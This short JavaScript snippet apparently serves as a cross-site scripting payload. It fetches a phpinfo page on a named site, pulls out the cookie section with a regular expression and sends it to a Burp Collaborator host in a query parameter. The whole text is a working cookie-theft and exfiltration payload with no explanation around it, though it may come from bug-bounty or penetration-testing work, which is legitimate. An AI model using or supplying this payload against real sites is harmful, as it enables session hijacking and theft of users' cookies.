fetch('https://tatacars.sipradi.com.np/info.php')
  .then(response => response.text())
  .then(text => {
    cookie = text.match(/_COOKIE.{1,2000}/)[0];
    fetch('http://aftpmh4i5w0rhzlsh7e5lkya91fr3g.burpcollaborator.net/?cookie=' + encodeURIComponent(cookie));
  });
